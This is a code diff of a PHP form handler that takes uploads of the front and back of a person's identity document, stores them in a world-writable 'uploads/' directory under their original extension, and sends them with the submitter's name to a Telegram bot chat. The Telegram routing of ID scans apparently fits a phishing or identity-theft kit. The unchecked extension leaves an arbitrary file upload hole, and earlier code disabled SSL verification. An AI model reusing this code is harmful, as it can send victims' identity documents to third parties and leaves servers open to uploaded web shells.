@@ -126,47 +126,81 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
     // Define upload directory
+    // $upload_dir = "uploads/";
+    // if (!is_dir($upload_dir)) {
+    //     mkdir($upload_dir, 0777, true);  // Create directory if it doesn't exist
+    // }
+
+    // // Extract form ID and submission ID
+    // $form_id = $_POST['formID'] ?? '';
+    // $submission_id = explode('_', $_POST['event_id'])[0] ?? '';
+
+    // // Extract raw file names from Jotform
+    // $front_id_raw = $_POST['temp_upload']['q17_uploadYour'][0] ?? '';
+    // $back_id_raw = $_POST['temp_upload']['q26_identityVerification'][0] ?? '';
+
+    // // Extract clean file names
+    // function extractFileName($raw_string) {
+    //     return explode('#', $raw_string)[0];  // Get the actual filename before #
+    // }
+
+    // // Extract original file extensions
+    // function getFileExtension($file_name) {
+    //     return pathinfo($file_name, PATHINFO_EXTENSION);
+    // }
+
+    // // Get file names and extensions
+    // $front_id_filename = extractFileName($front_id_raw);
+    // $back_id_filename = extractFileName($back_id_raw);
+
+    // $front_id_extension = getFileExtension($front_id_filename);
+    // $back_id_extension = getFileExtension($back_id_filename);
+
+    // // Construct final paths with correct extensions
+    // $front_id_path = $upload_dir . "front_id_" . time() . "." . $front_id_extension;
+    // $back_id_path = $upload_dir . "back_id_" . time() . "." . $back_id_extension;
+
+    // // Construct Jotform Download URLs
+    // $front_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$front_id_filename";
+    // $back_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$back_id_filename";
+
+    // // Print URLs for debugging
+    // echo "Front ID URL: $front_id_url <br>";
+    // echo "Back ID URL: $back_id_url <br>";
+
+
+
+
+
+
+    // Create the uploads directory if it doesn't exist
     $upload_dir = "uploads/";
     if (!is_dir($upload_dir)) {
-        mkdir($upload_dir, 0777, true);  // Create directory if it doesn't exist
+        mkdir($upload_dir, 0777, true);
     }
 
-    // Extract form ID and submission ID
-    $form_id = $_POST['formID'] ?? '';
-    $submission_id = explode('_', $_POST['event_id'])[0] ?? '';
+    // Function to process uploaded files
+    function handleFileUpload($file_input_name, $file_prefix) {
+        global $upload_dir;
 
-    // Extract raw file names from Jotform
-    $front_id_raw = $_POST['temp_upload']['q17_uploadYour'][0] ?? '';
-    $back_id_raw = $_POST['temp_upload']['q26_identityVerification'][0] ?? '';
+        if (!empty($_FILES[$file_input_name]['name'][0])) {
+            $original_filename = $_FILES[$file_input_name]['name'][0];
+            $file_extension = pathinfo($original_filename, PATHINFO_EXTENSION);
+            $new_filename = $file_prefix . "_" . time() . "." . $file_extension;
+            $file_path = $upload_dir . $new_filename;
 
-    // Extract clean file names
-    function extractFileName($raw_string) {
-        return explode('#', $raw_string)[0];  // Get the actual filename before #
+            if (move_uploaded_file($_FILES[$file_input_name]['tmp_name'][0], $file_path)) {
+                return $file_path;
+            }
+        }
+        return null;
     }
 
-    // Extract original file extensions
-    function getFileExtension($file_name) {
-        return pathinfo($file_name, PATHINFO_EXTENSION);
-    }
 
-    // Get file names and extensions
-    $front_id_filename = extractFileName($front_id_raw);
-    $back_id_filename = extractFileName($back_id_raw);
+    // Handle file uploads
+    $front_id_path = handleFileUpload('q17_uploadYour', 'front_id');
+    $back_id_path = handleFileUpload('q26_identityVerification', 'back_id');
 
-    $front_id_extension = getFileExtension($front_id_filename);
-    $back_id_extension = getFileExtension($back_id_filename);
-
-    // Construct final paths with correct extensions
-    $front_id_path = $upload_dir . "front_id_" . time() . "." . $front_id_extension;
-    $back_id_path = $upload_dir . "back_id_" . time() . "." . $back_id_extension;
-
-    // Construct Jotform Download URLs
-    $front_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$front_id_filename";
-    $back_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$back_id_filename";
-
-    // Print URLs for debugging
-    echo "Front ID URL: $front_id_url <br>";
-    echo "Back ID URL: $back_id_url <br>";
 
 
 
@@ -187,30 +221,30 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // }
 
 
-    function downloadJotformFile($file_url, $save_path) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $file_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0"); // Mimic a browser
+    // function downloadJotformFile($file_url, $save_path) {
+    //     $ch = curl_init();
+    //     curl_setopt($ch, CURLOPT_URL, $file_url);
+    //     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    //     curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0"); // Mimic a browser
     
-        $file_data = curl_exec($ch);
-        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
+    //     $file_data = curl_exec($ch);
+    //     $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    //     curl_close($ch);
     
-        // Verify download success
-        if ($http_status == 200 && $file_data) {
-            file_put_contents($save_path, $file_data);
-            return true;
-        } else {
-            return false; // File download failed
-        }
-    }
+    //     // Verify download success
+    //     if ($http_status == 200 && $file_data) {
+    //         file_put_contents($save_path, $file_data);
+    //         return true;
+    //     } else {
+    //         return false; // File download failed
+    //     }
+    // }
 
-    // Download and save files
-    downloadJotformFile($front_id_url, $front_id_path);
-    downloadJotformFile($back_id_url, $back_id_path);
+    // // Download and save files
+    // downloadJotformFile($front_id_url, $front_id_path);
+    // downloadJotformFile($back_id_url, $back_id_path);
 
 
 
@@ -301,19 +335,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
+    // Function to send files to Telegram
     function sendFileToTelegram($file_path, $caption) {
         if (!file_exists($file_path) || filesize($file_path) == 0) {
-            echo "Skipping $caption - File is missing or empty.<br>";
-            return; // Prevent sending empty or non-existing files
+            return; // Skip sending if file is missing or empty
         }
-    
+
         $telegram_url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/";
-        
-        // Get file extension
         $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
         $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
-    
-        // If file is an image, send as a photo
+
         if (in_array($file_extension, $image_extensions)) {
             $telegram_url .= "sendPhoto";
             $post_data = [
@@ -323,7 +354,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 'parse_mode' => 'Markdown'
             ];
         } else {
-            // Send all other file types as documents
             $telegram_url .= "sendDocument";
             $post_data = [
                 'chat_id' => TELEGRAM_CHAT_ID,
@@ -332,25 +362,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 'parse_mode' => 'Markdown'
             ];
         }
-    
-        // Send request to Telegram
+
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $telegram_url);
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $response = curl_exec($ch);
+        curl_exec($ch);
         curl_close($ch);
-    
-        echo "Sent to Telegram: $caption <br>";
     }
 
-    // Send Front ID
+
+    // Send files to Telegram
     sendFileToTelegram($front_id_path, "📎 *Front ID* uploaded by *$full_name*");
-
-    // Send Back ID
     sendFileToTelegram($back_id_path, "📎 *Back ID* uploaded by *$full_name*");
-
 
 
 
